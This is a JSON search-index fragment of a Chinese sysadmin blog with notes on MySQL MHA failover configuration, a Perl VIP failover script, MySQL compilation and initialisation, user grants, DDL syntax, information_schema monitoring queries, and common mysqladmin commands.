访问MHA manger和MHA mysql节点的OS系统帐号 ssh_user=root # \u003e https://www.cnblogs.com/xiaoboluo768/p/5973827.html # 故障时自动调用的脚本，一般用于自动vip漂移 master_ip_failover_script=/usr/local/bin/master_ip_failover # 故障时发送报告调用的脚本 # report_script= # 节点信息配置，下列顺序将影响选主的权重，号码越小权重越高 [server1] hostname=10.0.2.25 port=3306 [server2] hostname=10.0.2.26 port=3306 [server3] hostname=10.0.2.27 port=3306 # binlogserver配置，要求一台额外的机器，mysql 5.6以上，支持gtid并开启, 其作用是用于同步主库的binlog内容 # 必须叫这个名字binlog1，是MHA定义好的 [binlog1] # 永远不会被选主 no_master=1 hostname=10.0.2.27 port=3306 # 需要手动创建这个目录，并目录不能与原目录一致 master_binlog_dir=/data/mysqldb/binlog-server # 状态检查 ## 互信状态检查 $\u003e masterha_check_ssh --conf=/etc/mha/app1.cnf ## 主从状态检查 $\u003e masterha_check_repl --conf=/etc/mha/app1.cnf # 开启MHA --remove_dead_master_conf 自动将故障节点从配置文件中移除 --ignore_last_failover $\u003e nohup masterha_manager --conf=/etc/mha/app1.cnf --remove_dead_master_conf --ignore_last_failover \u003c /dev/null \u003e /var/log/mha/app1/manager.log 2\u003e\u00261 \u0026 # 查看MHA状态 $\u003e masterha_check_status --conf=/etc/mha/app1.cnf ","date":"2022-06-24","objectID":"/posts/mysql/mha%E9%AB%98%E5%8F%AF%E7%94%A8%E8%BD%AF%E4%BB%B6/:4:0","tags":["linux","mysql"],"title":"Mysql MHA高可用软件","uri":"/posts/mysql/mha%E9%AB%98%E5%8F%AF%E7%94%A8%E8%BD%AF%E4%BB%B6/"},{"categories":["linux","运维记事"],"content":"故障演示 监控MHA Manager日志/var/log/mha/manager，手动关闭mysql主库(10.0.2.25), 日志体现，开始检查主库状态，在每隔2秒检查共3次后，第四次仍然检查失败，自动切换主库为第二个节点(10.0.2.26-自动计算), 从配置文件中删除故障节点配置，并自动关闭MHA Manager程序。 ","date":"2022-06-24","objectID":"/posts/mysql/mha%E9%AB%98%E5%8F%AF%E7%94%A8%E8%BD%AF%E4%BB%B6/:5:0","tags":["linux","mysql"],"title":"Mysql MHA高可用软件","uri":"/posts/mysql/mha%E9%AB%98%E5%8F%AF%E7%94%A8%E8%BD%AF%E4%BB%B6/"},{"categories":["linux","运维记事"],"content":"故障解决 恢复故障主节点，并将故障主节点作为从节点重新恢复(生产环境建议直接重建加入)加入到集群内部去(在MHA Manager管理日志中,会包含恢复时该执行的命令change master xxxx), 执行change master xxxx(mha日志中有体现)，然后start salve，最后手动添加故障节点配置到mha配置文件(/etc/mha/app1.cnf)中，重新启动mha管理 ","date":"2022-06-24","objectID":"/posts/mysql/mha%E9%AB%98%E5%8F%AF%E7%94%A8%E8%BD%AF%E4%BB%B6/:6:0","tags":["linux","mysql"],"title":"Mysql MHA高可用软件","uri":"/posts/mysql/mha%E9%AB%98%E5%8F%AF%E7%94%A8%E8%BD%AF%E4%BB%B6/"},{"categories":["linux","运维记事"],"content":"MHA binlongserver # 1. binlogserver配置，要求一台额外的机器，mysql 5.6以上，支持gtid并开启, 其作用是用于同步主库的binlog内容 $\u003e vim /etc/mha/app1.cnf # 必须叫这个名字binlog1，是MHA定义好的 [binlog1] # 永远不会被选主 no_master=1 hostname=10.0.2.27 port=3306 # 需要手动创建这个目录，并目录不能与原目录一致 master_binlog_dir=/data/mysqldb/binlog-server # 2. 配置节点创建对应目录(权限) $\u003e mkdir -p /data/mysqldb/binlog-server # 3. 拉取主库的binlog日志,先确认下主库是从多少开始的 show binary logs; 需全部拉取下来 # binlog拉取本身和mha没什么关系，但需要在mha启动是前处理好，否这mha将无法正常启动 $\u003e cd /data/mysqldb/binlog-server \u0026\u0026 mysqlbinlog -R --host=10.0.2.26 --user=mha --password=mha --raw --stop-never mysql-bin.000001 \u0026 # 4. 重启mha $\u003e masterha_stop --conf=/etc/mha/app1.cnf $\u003e nohup masterha_manager --conf=/etc/mha/app1.cnf --remove_dead_master_conf --ignore_last_failover \u003c /dev/null \u003e /var/log/mha/app1/manager.log 2\u003e\u00261 \u0026 # 5. 故障演示 # 主库宕机，binlogserver自动停止，manager也会自动停止 # 主库宕机，binlogserver日志也是无效了，需要重新同步 # 解决方案: # 1. 重新获取新主库的binlog到binlogserver中 # 2. 重新配置配文件的binlog server信息 # 3. 最后在启动mha ","date":"2022-06-24","objectID":"/posts/mysql/mha%E9%AB%98%E5%8F%AF%E7%94%A8%E8%BD%AF%E4%BB%B6/:7:0","tags":["linux","mysql"],"title":"Mysql MHA高可用软件","uri":"/posts/mysql/mha%E9%AB%98%E5%8F%AF%E7%94%A8%E8%BD%AF%E4%BB%B6/"},{"categories":["linux","运维记事"],"content":"MHA 的vip功能 mha提供了vip接口,使用脚本自己实现，源码包中也提供了模板(perl，看不懂，找的这个虽然也是perl的)，配置文件/etc/mha/app1.cnf中[server default]下添加master_ip_failover_script=/usr/local/bin/master_ip_failover , 然后在主库上，手动生成第一个vip地址ip addr add 10.0.2.8/24 dev eth0 ,以下为脚本内容 $\u003e vim /usr/local/bin/master_ip_failover # 注意执行权限 #!/usr/bin/env perl use strict; use warnings FATAL =\u003e 'all'; use Getopt::Long; my ( $command, $ssh_user, $orig_master_host, $orig_master_ip, $orig_master_port, $new_master_host, $new_master_ip, $new_master_port ); my $vip = '10.0.2.8/24'; # Virtual IP # 通过ip绑定的ifconfig 无法查看到 my $ssh_start_vip = \"/sbin/ip addr add $vip dev eth0\"; my $ssh_stop_vip = \"/sbin/ip addr del $vip dev eth0\"; # # my $key = \"1\"; # my $ssh_start_vip = \"/sbin/ifconfig eth0:$key $vip\"; # my $ssh_stop_vip = \"/sbin/ifconfig eth0:$key down\"; $ssh_user = \"root\"; GetOptions( 'command=s' =\u003e \\$command, 'ssh_user=s' =\u003e \\$ssh_user, 'orig_master_host=s' =\u003e \\$orig_master_host, 'orig_master_ip=s' =\u003e \\$orig_master_ip, 'orig_master_port=i' =\u003e \\$orig_master_port, 'new_master_host=s' =\u003e \\$new_master_host, 'new_master_ip=s' =\u003e \\$new_master_ip, 'new_master_port=i' =\u003e \\$new_master_port, ); exit \u0026main(); sub main { print \"\\n\\nIN SCRIPT TEST====$ssh_stop_vip==$ssh_start_vip===\\n\\n\"; if ( $command eq \"stop\" || $command eq \"stopssh\" ) { # $orig_master_host, $orig_master_ip, $orig_master_port are passed. # If you manage master ip address at global catalog database, # invalidate orig_master_ip here. my $exit_code = 1; eval { print \"Disabling the VIP on old master: $orig_master_host \\n\"; \u0026stop_vip(); $exit_code = 0; }; if ($@) { warn \"Got Error: $@\\n\"; exit $exit_code; } exit $exit_code; } elsif ( $command eq \"start\" ) { # all arguments are passed. # If you manage master ip address at global catalog database, # activate new_master_ip here. # You can also grant write access (create user, set read_only=0, etc) here. my $exit_code = 10; eval { print \"Enabling the VIP - $vip on the new master - $new_master_host \\n\"; \u0026start_vip(); $exit_code = 0; }; if ($@) { warn $@; exit $exit_code; } exit $exit_code; } elsif ( $command eq \"status\" ) { print \"Checking the Status of the script.. OK \\n\"; `ssh $ssh_user\\@cluster1 \\\" $ssh_start_vip \\\"`; exit 0; } else { \u0026usage(); exit 1; } } # A simple system call that enable the VIP on the new master sub start_vip() { `ssh $ssh_user\\@$new_master_host \\\" $ssh_start_vip \\\"`; } # A simple system call that disable the VIP on the old_master sub stop_vip() { `ssh $ssh_user\\@$orig_master_host \\\" $ssh_stop_vip \\\"`; } sub usage { print \"Usage: master_ip_failover --command=start|stop|stopssh|status --orig_master_host=host --orig_master_ip=ip --orig_master_port=port --new_master_host=host --new_master_ip=ip --new_master_port=port\\n\"; } ","date":"2022-06-24","objectID":"/posts/mysql/mha%E9%AB%98%E5%8F%AF%E7%94%A8%E8%BD%AF%E4%BB%B6/:8:0","tags":["linux","mysql"],"title":"Mysql MHA高可用软件","uri":"/posts/mysql/mha%E9%AB%98%E5%8F%AF%E7%94%A8%E8%BD%AF%E4%BB%B6/"},{"categories":["linux","运维记事"],"content":"软件构成 Manager 工具包主要包括 - - masterha_check_ssh 检查MHA的SSH配置状况 masterha_check_repl 检查MySQL复制情况 masterha_check_status 检测当前MHA运行状态 masterha_manager 启动MHA masterha_master_monitor 检测master是否宕机 masterha_master_switch 控制故障转移(自动或手动) masterha_conf_host 添加或删除配置的server信息 Node工具包(这些工具通常有MHA Manager的脚本处罚，无需认为操作) - - save_binary_log 保存和复制master的二进制日志 apply_diff_relay_log 识别差异的中级日志事件并将其差异的事件应用于其他的 slave filter_mysqlbinlog 去除不必要的ROLLBACK事件(MHA已不再使用这个工具) purge_relay_log 清除中级日志(不会阻塞SQL线程) ","date":"2022-06-24","objectID":"/posts/mysql/mha%E9%AB%98%E5%8F%AF%E7%94%A8%E8%BD%AF%E4%BB%B6/:9:0","tags":["linux","mysql"],"title":"Mysql MHA高可用软件","uri":"/posts/mysql/mha%E9%AB%98%E5%8F%AF%E7%94%A8%E8%BD%AF%E4%BB%B6/"},{"categories":["linux","运维记事"],"content":"Mysql安装","date":"2022-06-24","objectID":"/posts/mysql/mysql%E5%AE%89%E8%A3%85/","tags":["linux","mysql"],"title":"Mysql安装","uri":"/posts/mysql/mysql%E5%AE%89%E8%A3%85/"},{"categories":["linux","运维记事"],"content":"版本选择 选择GA版本 6-12 个月的产品(对于开发来说,单数版本一般为测试版本) ","date":"2022-06-24","objectID":"/posts/mysql/mysql%E5%AE%89%E8%A3%85/:1:0","tags":["linux","mysql"],"title":"Mysql安装","uri":"/posts/mysql/mysql%E5%AE%89%E8%A3%85/"},{"categories":["linux","运维记事"],"content":"编译安装 yum install -y ncurses-devel libaio-devel cmake openssl-devel cmake . -DCMAKE_INSTALL_PREFIX=/opt/software/mysql-5.6.48 \\ -DMYSQL_DATADIR=/opt/software/mysql-server/data \\ -DMYSQL_UNIX_ADDR=/opt/software/mysql-server/mysql.sock \\ -DDEFAULT_CHARSET=utf8 \\ -DDEFAULT_COLLATION=utf8_general_ci \\ -DWITH_EXTRA_CHARSETS=all \\ -DWITH_INNOBASE_STORAGE_ENGINE=1 \\ -DWITH_FEDERATED_STORAGE_ENGINE=1 \\ -DWITH_BLACKHOLE_STORAGE_ENGINE=1 \\ -DWITHOUT_EXAMPLE_STORAGE_ENGINE=1 \\ -DWITH_ZLIB=bundled \\ -DWITH_SSL=system \\ -DENABLED_LOCAL_INFILE=1 \\ -DWITH_EMBEDDED_SERVER=1 \\ -DENABLE_DOWNLOADS=1 \\ -DWITH_DEBUG=0 ","date":"2022-06-24","objectID":"/posts/mysql/mysql%E5%AE%89%E8%A3%85/:2:0","tags":["linux","mysql"],"title":"Mysql安装","uri":"/posts/mysql/mysql%E5%AE%89%E8%A3%85/"},{"categories":["linux","运维记事"],"content":"初始化 ","date":"2022-06-24","objectID":"/posts/mysql/mysql%E5%AE%89%E8%A3%85/:3:0","tags":["linux","mysql"],"title":"Mysql安装","uri":"/posts/mysql/mysql%E5%AE%89%E8%A3%85/"},{"categories":["linux","运维记事"],"content":"初始化数据目录 以下是根据多实例配置来初始化一些信息的,可根据实际情况修改,另外程序是官方的二进制程序,如果是自己编译的,在指定了默认参数的情况下,下列描述的一些问题应该并不存在 # 简单示例 $\u003e mkdir /data/mysql56/3307/{data,logs,tmp} -p # 注意修正权限 $\u003e cat /data/mysql56/3307/my.cnf # 示例配置 [client] default-character-set = utf8mb4 socket = /data/mysql56/3307/mysql.sock [mysql] default-character-set = utf8mb4 socket = /data/mysql56/3307/mysql.sock [mysqld] port=3307 bind-address = 0.0.0.0 socket = /data/mysql56/3307/mysql.sock pid-file = /data/mysql56/3307/mysql.pid basedir = /opt/mysql56 datadir = /data/mysql56/3307/data tmpdir = /data/mysql56/3307/tmp log-error=/data/mysql56/3307/logs/mysqld.log skip-name-resolve ","date":"2022-06-24","objectID":"/posts/mysql/mysql%E5%AE%89%E8%A3%85/:4:0","tags":["linux","mysql"],"title":"Mysql安装","uri":"/posts/mysql/mysql%E5%AE%89%E8%A3%85/"},{"categories":["linux","运维记事"],"content":"5.7 5.7已经没有mysql_install_db初始化脚本,现通过mysqld进行初始化,其他配置参考5.6的配置方案 https://dev.mysql.com/get/Downloads/MySQL-5.7/mysql-5.7.32-linux-glibc2.12-x86_64.tar.gz # 建议使用定制的 my.cnf 来进行初始化 # $\u003e /opt/mysql57/bin/mysqld --defaults-file=/data/mysql57/3307/etc/my.cnf --initialize-insecure --user=mysql $\u003e /opt/mysql57/bin/mysqld \\ --initialize-insecure \\ --user=mysql \\ --basedir=/opt/mysql57 \\ --datadir=/data/mysql57/3307/data ","date":"2022-06-24","objectID":"/posts/mysql/mysql%E5%AE%89%E8%A3%85/:5:0","tags":["linux","mysql"],"title":"Mysql安装","uri":"/posts/mysql/mysql%E5%AE%89%E8%A3%85/"},{"categories":["linux","运维记事"],"content":"5.6 https://dev.mysql.com/get/Downloads/MySQL-5.6/mysql-5.6.50-linux-glibc2.12-x86_64.tar.gz # 建议使用定制的 my.cnf 来进行初始化(使用配置文件仍然需要指定basedir路径或者执行时切换到安装目录,他的这个值是从命令行读取的,没有读取到的话,basedir默认为'.', mysql_install_db:426 行 ) $\u003e cd /opt/mysql56 \u0026\u0026 /opt/mysql56/scripts/mysql_install_db --defaults-file=/data/mysql56/3307/etc/my.cnf --user=mysql # $\u003e /opt/mysql56/scripts/mysql_install_db --user=mysql --basedir=/opt/mysql56 --datadir=/data/mysql56/3307/data ","date":"2022-06-24","objectID":"/posts/mysql/mysql%E5%AE%89%E8%A3%85/:6:0","tags":["linux","mysql"],"title":"Mysql安装","uri":"/posts/mysql/mysql%E5%AE%89%E8%A3%85/"},{"categories":["linux","运维记事"],"content":"启动管理 $\u003e /opt/mysql56/bin/mysqld_safe --defaults-file=/data/mysql56/3307/etc/my.cnf # 在程序目录下 support-files/mysql.server 为官方的管理脚本， 将其复制到/etc/init.d/下，systemd重载配置后会自动生成对应名字的systemd管理单元 ","date":"2022-06-24","objectID":"/posts/mysql/mysql%E5%AE%89%E8%A3%85/:7:0","tags":["linux","mysql"],"title":"Mysql安装","uri":"/posts/mysql/mysql%E5%AE%89%E8%A3%85/"},{"categories":["linux","运维记事"],"content":"Mysql程序模型","date":"2022-06-24","objectID":"/posts/mysql/mysql%E7%A8%8B%E5%BA%8F%E6%A8%A1%E5%9E%8B/","tags":["linux","mysql"],"title":"Mysql程序模型(草稿)","uri":"/posts/mysql/mysql%E7%A8%8B%E5%BA%8F%E6%A8%A1%E5%9E%8B/"},{"categories":["linux","运维记事"],"content":"Mysql程序模型 技巧 mysql程序模型 ","date":"2022-06-24","objectID":"/posts/mysql/mysql%E7%A8%8B%E5%BA%8F%E6%A8%A1%E5%9E%8B/:1:0","tags":["linux","mysql"],"title":"Mysql程序模型(草稿)","uri":"/posts/mysql/mysql%E7%A8%8B%E5%BA%8F%E6%A8%A1%E5%9E%8B/"},{"categories":["linux","运维记事"],"content":"连接层 TCP/IP或Socket的连接方式 验证用户名密码 连接线程: 接收sql语句,返回执行结果 ","date":"2022-06-24","objectID":"/posts/mysql/mysql%E7%A8%8B%E5%BA%8F%E6%A8%A1%E5%9E%8B/:2:0","tags":["linux","mysql"],"title":"Mysql程序模型(草稿)","uri":"/posts/mysql/mysql%E7%A8%8B%E5%BA%8F%E6%A8%A1%E5%9E%8B/"},{"categories":["linux","运维记事"],"content":"SQL层: 语法检查模块,检查上层发过来的SQL是否符合规范 权限检查模块.检查当前登陆用户是否由权限操作数据库对象 语法定义模块,识别语句种类 解析器,解析出SQL语句所有可能的执行方式,这些方式被称为\"执行计划\" 优化器,基于执行代价(基于系统资源的消耗作为维度 \u003ccpu/mem/io\u003e),管理员可以通过间接的方法,干预优化器的选择(索引) 执行器,按照优化器选择的\"最优\"的执行计划执行SQL,得出结论: 某某磁盘的某某位置 查询缓存,一般会用redis类产品替代 记录查询日志 ","date":"2022-06-24","objectID":"/posts/mysql/mysql%E7%A8%8B%E5%BA%8F%E6%A8%A1%E5%9E%8B/:3:0","tags":["linux","mysql"],"title":"Mysql程序模型(草稿)","uri":"/posts/mysql/mysql%E7%A8%8B%E5%BA%8F%E6%A8%A1%E5%9E%8B/"},{"categories":["linux","运维记事"],"content":"存储引擎层 根据SQL层的执行结果,去磁盘找到对应的数据,结构化为表的模式返回给用户 和\"磁盘(文件系统)“打交道的层次 ","date":"2022-06-24","objectID":"/posts/mysql/mysql%E7%A8%8B%E5%BA%8F%E6%A8%A1%E5%9E%8B/:4:0","tags":["linux","mysql"],"title":"Mysql程序模型(草稿)","uri":"/posts/mysql/mysql%E7%A8%8B%E5%BA%8F%E6%A8%A1%E5%9E%8B/"},{"categories":["linux","运维记事"],"content":"逻辑结构 ","date":"2022-06-24","objectID":"/posts/mysql/mysql%E7%A8%8B%E5%BA%8F%E6%A8%A1%E5%9E%8B/:5:0","tags":["linux","mysql"],"title":"Mysql程序模型(草稿)","uri":"/posts/mysql/mysql%E7%A8%8B%E5%BA%8F%E6%A8%A1%E5%9E%8B/"},{"categories":["linux","运维记事"],"content":"抽象结构 库(databases,schema) – 文件夹 表(table) – 文件 ","date":"2022-06-24","objectID":"/posts/mysql/mysql%E7%A8%8B%E5%BA%8F%E6%A8%A1%E5%9E%8B/:6:0","tags":["linux","mysql"],"title":"Mysql程序模型(草稿)","uri":"/posts/mysql/mysql%E7%A8%8B%E5%BA%8F%E6%A8%A1%E5%9E%8B/"},{"categories":["linux","运维记事"],"content":"物理结构 … ","date":"2022-06-24","objectID":"/posts/mysql/mysql%E7%A8%8B%E5%BA%8F%E6%A8%A1%E5%9E%8B/:7:0","tags":["linux","mysql"],"title":"Mysql程序模型(草稿)","uri":"/posts/mysql/mysql%E7%A8%8B%E5%BA%8F%E6%A8%A1%E5%9E%8B/"},{"categories":["linux","运维记事"],"content":"Mysql管理","date":"2022-06-24","objectID":"/posts/mysql/mysql%E7%AE%A1%E7%90%86/","tags":["linux","mysql"],"title":"Mysql管理","uri":"/posts/mysql/mysql%E7%AE%A1%E7%90%86/"},{"categories":["linux","运维记事"],"content":"用户管理 -- 授权语法 mysql\u003e grant \u003c权限\u003e on \u003c库名.表名\u003e to \u003c用户名\u003e@'\u003c可连接主机(名|ip)\u003e' identified by '\u003c密码\u003e'; -- 权限: SELECT,INSERT,UPDATE,DELETE,CREATE,DROP,RELOAD,SHUTDOWN,PROCESS,FILE,REFERENCES,INDEX,ALTER,SHOW DATABASES,SUPER,CREATE TEMPORARY TABLES,LOCK TABLES,EXECUTE,REPLICATION SLAVE,REPLICATION CLIENT,CREATE VIEW,SHOW VIEW,CREATE ROUTINE,ALTER ROUTINE,CREATE USER,EVENT,TRIGGER,CREATE TABLESPACE -- 用户创建 mysql\u003e create user monitor@'10.0.2.2%' identified by 'Aa@@123456'; -- 用户授权: 授权后用户也可以创建数据库,但仅限创建授权了的库. mysql\u003e grant SELECT,INSERT,UPDATE,DELETE,CREATE,DROP on testdb.* to monitor@'10.0.2.26'; -- 用户删除 mysql\u003e drop user root@'node26'; mysql\u003e drop user ''@'node26'; -- 查询用户权限 mysql\u003e show grants for root@'localhost'; -- 取消权限 mysql\u003e revoke create,drop on testdb.* from monitor@'10.0.2.26'; mysql\u003e revoke all on testdb.* from monitor@'10.0.2.26'; ","date":"2022-06-24","objectID":"/posts/mysql/mysql%E7%AE%A1%E7%90%86/:1:0","tags":["linux","mysql"],"title":"Mysql管理","uri":"/posts/mysql/mysql%E7%AE%A1%E7%90%86/"},{"categories":["linux","运维记事"],"content":"操作方式 ","date":"2022-06-24","objectID":"/posts/mysql/mysql%E7%AE%A1%E7%90%86/:2:0","tags":["linux","mysql"],"title":"Mysql管理","uri":"/posts/mysql/mysql%E7%AE%A1%E7%90%86/"},{"categories":["linux","运维记事"],"content":"分类 DDL: 数据定义语言 alert 库定义: 创建库定义 开发规范: 库名不能出现大写(win和linux区分大小写) 库名不能以数字开头 库名要和有业务功能相关 建库要加字符集 DCL: 数据控制语言 grant/revoke DML: 数据操作语言 insert/update/delete DQL: 数据查询语言 select 帮助命令: mysql\u003e help create database 常用的show语句 -- 显示所有数据库 show databases; -- 显示当前数据库中的默认表 show tables; -- 显示指定数据库中的表信息 show tables from world; -- 显示表列结构 show columns from world.city; -- 显示表中有关索引和索引列的信息 show index from world.city; -- 显示可用字符集和默认校验规则 show character set; -- 显示可用校验规则 show collation; -- 显示数据库状态 show status; -- 显示数据库中的参数定义值 show variables 非交互式 $\u003e mysql -u\u003c用户名\u003e -p\u003c密码\u003e -e \"select user,host,password from mysql.user\" 交互式 - SQL结构化的查询语言 $\u003e mysql -u\u003c用户名\u003e -p\u003c密码\u003e mysql\u003e show databases; \\G: 将数据转key-value的形式显示,table_name:value,\\G时不能使用 ; 结 尾 mysql\u003e show databases\\G 记录操作日志到某个文件(类似script和screen记录日志的功能) mysql\u003e tee /tmp/test.log mysql\u003e show databases; 结束上一条命令(正常情况下mysql\u003e 下不能使用ctrl+c) mysql\u003e sssss\\c 查看当前数据库基本状态 mysql\u003e \\s # status 执行外部sql脚本 mysql\u003e source \u003cfilename\u003e # \\. \u003cfilename\u003e 切换到某一个数据库 mysql\u003e use mysql # \\u mysql 创建数据库 character set: 字符集 collate: 校验规则 mysql\u003e create {database|schema} testdb02 default {charset|character set} utf8 collate utf8_bin; 查询建库语句 mysql\u003e show create {database|schema} testdb02; 修改数据库字符集(修改时需要注意,字符集一定是从小往大改,后者必定是前者的严格超集,一般生产不建议改动,如uft8可以改成utf8mb4) mysql\u003e alter {database|schema} testdb02 {charset|character set} utf8mb4; # collate utf8mb4_bin 修改数据库表字符集 mysql\u003e alter table t1 character set latin1 删除数据库 mysql\u003e drop {database|schema} testdb02; 创建表 mysql\u003e create table t1(id int(10))engine=innodb charset=utf8; mysql\u003e create table t1 like t2 mysql\u003e create table t1_bak select * from t1 # 忽略外键/主键 修改表名 mysql\u003e rename table t1 to student; mysql\u003e alter table student rename to stu; 查看建表语句 mysql\u003e show create table stu; 添加列 mysql\u003e alter table stu add c1 int,add num int; 在指定列后添加列 mysql\u003e alter table stu add stuid int after id; 添加列到最前 mysql\u003e alter table stu add sid int first; 删除列 mysql\u003e alter table stu drop stuid; 修改列(可同时修改数据类型) mysql\u003e alter table stu change c1 stu_name varchar(12); 修改列 mysql\u003e alter table stu modify stu_name varchar(33); 查看列结构 mysql\u003e desc stu; 删除表 mysql\u003e drop table stu; 查看mysql支持的字符集和校验规则 show CHARACTER set show collation ","date":"2022-06-24","objectID":"/posts/mysql/mysql%E7%AE%A1%E7%90%86/:3:0","tags":["linux","mysql"],"title":"Mysql管理","uri":"/posts/mysql/mysql%E7%AE%A1%E7%90%86/"},{"categories":["linux","运维记事"],"content":"Mysql监控指标","date":"2022-06-24","objectID":"/posts/mysql/mysql%E7%9B%91%E6%8E%A7%E6%8C%87%E6%A0%87/","tags":["linux","mysql"],"title":"Mysql监控指标","uri":"/posts/mysql/mysql%E7%9B%91%E6%8E%A7%E6%8C%87%E6%A0%87/"},{"categories":["linux","运维记事"],"content":"元数据获取 元数据存储于information_schema库中,其作用充当数据库元数据的中央系统信息库,使用表格形式以实现灵活的访问,另外他是虚拟数据库,其表非真实表,而是系统视图,其根据当前用户的特权动态填充表.只能进行查询. 列名 描述 table_schema 表所在的库 table_name 表名字 engine 表的引擎 table_rows 表的行数 avg_row_length 平均行长度 index_length 索引长度 查看字符集默认校验规则 SELECT c.CHARACTER_SET_NAME ,c.COLLATION_NAME FROM INFORMATION_SCHEMA.COLLATIONS c WHERE c.IS_DEFAULT = 'yes'; 利用CONCAT拼接逐表备份语句 select concat(\"mysqldump -uroot --default-character-set=utf8mb4 --single-transaction -R -E \" ,t.TABLE_SCHEMA ,\" \",t.TABLE_NAME ,\" | gzip \u003e /data/backup/\",t.TABLE_SCHEMA ,\"_\" ,date_format(now(),'%Y%m%d%k%i') ,\"/\" ,t.TABLE_NAME ,\".sql.gz\") from information_schema.TABLES t where t.TABLE_SCHEMA = 'mysql' into outfile '/tmp/mysql.sql' ; -- into outfile '/tmp/mysql.sql' -- 需设置安全路径 /etc/my.cnf:[mysqld] secure-file-priv=/tmp ,重启 统计每个库下的每个表个数(监控) select table_schema,count(table_name) from `TABLES` group by table_schema; 统计某个库下的所有表的行数(监控) select table_name,table_rows from tables where table_schema='zabbix' 统计某个数据库的数据量 select table_schema,sum(avg_row_length*table_rows+index_length)/1024/1024 as size_mb from information_schema.tables group by table_schema; SELECT TABLE_SCHEMA, SUM(DATA_LENGTH)/1024/1024 as size_mb FROM TABLES GROUP BY TABLE_SCHEMA; ","date":"2022-06-24","objectID":"/posts/mysql/mysql%E7%9B%91%E6%8E%A7%E6%8C%87%E6%A0%87/:1:0","tags":["linux","mysql"],"title":"Mysql监控指标","uri":"/posts/mysql/mysql%E7%9B%91%E6%8E%A7%E6%8C%87%E6%A0%87/"},{"categories":["linux","运维记事"],"content":"Mysql密码重置","date":"2022-06-24","objectID":"/posts/mysql/mysql%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE/","tags":["linux","mysql"],"title":"Mysql密码重置","uri":"/posts/mysql/mysql%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE/"},{"categories":["linux","运维记事"],"content":" 重置 MySQL 或 MariaDB Root 密码(在mysql停止的情况下重置mysql密码) https://linux.cn/article-9990-1.html?utm_source=index\u0026utm_medium=moremore ","date":"2022-06-24","objectID":"/posts/mysql/mysql%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE/:0:0","tags":["linux","mysql"],"title":"Mysql密码重置","uri":"/posts/mysql/mysql%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE/"},{"categories":["linux","运维记事"],"content":"Mysql命令收集","date":"2022-06-24","objectID":"/posts/mysql/mysql%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/","tags":["linux","mysql"],"title":"Mysql命令收集","uri":"/posts/mysql/mysql%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/"},{"categories":["linux","运维记事"],"content":"DBA 账号授权 GRANT ALL PRIVILEGES ON *.* TO 'root'@'ip' Identified by \"密码\" WITH GRANT OPTION; ","date":"2022-06-24","objectID":"/posts/mysql/mysql%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/:1:0","tags":["linux","mysql"],"title":"Mysql命令收集","uri":"/posts/mysql/mysql%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/"},{"categories":["linux","运维记事"],"content":"检测mysql server是否正常提供服务 mysqladmin -u sky -ppwd -h localhost ping ","date":"2022-06-24","objectID":"/posts/mysql/mysql%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/:2:0","tags":["linux","mysql"],"title":"Mysql命令收集","uri":"/posts/mysql/mysql%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/"},{"categories":["linux","运维记事"],"content":"获取mysql当前的几个状态值 mysqladmin -u sky -ppwd -h localhost status ","date":"2022-06-24","objectID":"/posts/mysql/mysql%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/:3:0","tags":["linux","mysql"],"title":"Mysql命令收集","uri":"/posts/mysql/mysql%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/"},{"categories":["linux","运维记事"],"content":"获取数据库当前的连接信息 mysqladmin -u sky -ppwd -h localhost processlist ","date":"2022-06-24","objectID":"/posts/mysql/mysql%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/:4:0","tags":["linux","mysql"],"title":"Mysql命令收集","uri":"/posts/mysql/mysql%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/"},{"categories":["linux","运维记事"],"content":"获取当前数据库的连接数 mysql -u root -ppwd -BNe \"select host,count(host) from processlist group by host;\" information_schema ","date":"2022-06-24","objectID":"/posts/mysql/mysql%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/:5:0","tags":["linux","mysql"],"title":"Mysql命令收集","uri":"/posts/mysql/mysql%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/"},{"categories":["linux","运维记事"],"content":"显示mysql的uptime mysql -e\"SHOW STATUS LIKE '%uptime%'\"|awk '/ptime/{ calc = $NF / 3600;print $(NF-1), calc\"Hour\" }' ","date":"2022-06-24","objectID":"/posts/mysql/mysql%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/:6:0","tags":["linux","mysql"],"title":"Mysql命令收集","uri":"/posts/mysql/mysql%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/"},{"categories":["linux","运维记事"],"content":"查看数据库的大小 mysql -u root -ppwd-e 'select table_schema,round(sum(data_length+index_length)/1024/1024,4) from information_schema.tables group by table_schema;' ","date":"2022-06-24","objectID":"/posts/mysql/mysql%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/:7:0","tags":["linux","mysql"],"title":"Mysql命令收集","uri":"/posts/mysql/mysql%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/"},{"categories":["linux","运维记事"],"content":"查看某个表的列信息 mysql -u \u003cuser\u003e --password=\u003cpassword\u003e -e \"SHOW COLUMNS FROM \u003ctable\u003e\" \u003cdatabase\u003e | awk '{print $1}' | tr \"\\n\" \",\" | sed 's/,$//g' ","date":"2022-06-24","objectID":"/posts/mysql/mysql%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/:8:0","tags":["linux","mysql"],"title":"Mysql命令收集","uri":"/posts/mysql/mysql%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/"},{"categories":["linux","运维记事"],"content":"执行mysql脚本 mysql -u user-name -p password \u003c script.sql 